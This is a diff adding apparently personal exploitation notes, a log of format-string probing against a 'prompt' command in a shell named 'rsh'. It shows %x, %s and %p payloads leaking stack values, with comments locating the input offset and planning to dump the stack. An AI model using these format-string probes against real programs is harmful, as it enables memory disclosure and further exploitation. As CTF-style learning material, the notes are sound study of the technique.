@@ -1,0 +1,21 @@
+rsh$
+ > prompt
+
+Enter new prompt string:
+ > %x %x %x %x %x %x %x %x %x
+64 f7f8e5a0 0 f7fcae39 25207825 78252078 20782520 25207825 78252078
+
+rsh$
+ > prompt
+Enter new prompt string:
+ > %x %x %x %s %x
+64 f7f8e5a0 0 ��Ǳ 25207825
+
+# our input pattern starts at the fifth element (25207825 = "% x%")
+Enter new prompt string:
+ > %p %p %p %p %p
+0x64 0xf7f8e5a0 (nil) 0xf7fcae39 0x25207025
+
+# 0xf7f8e5a0 or 0xf7fcae39 might be the ptr to the start of the buffer
+
+# lets try to leak the entire stack bit by bit
